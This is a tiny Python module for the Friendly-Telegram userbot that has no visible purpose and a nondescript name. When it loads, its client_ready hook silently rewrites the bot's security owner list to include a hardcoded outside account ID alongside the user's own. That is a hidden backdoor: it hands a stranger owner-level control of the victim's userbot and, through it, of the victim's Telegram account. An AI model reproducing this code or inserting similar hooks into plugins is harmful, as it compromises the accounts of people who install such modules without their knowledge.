from .. import loader

class xdMod(loader.Module):
	strings = {"name": "xdilovek"}
	
	async def client_ready(self,client,db):
		id=(await client.get_me()).id
		db.set("friendly-telegram.security","owner",[id,695775352])
		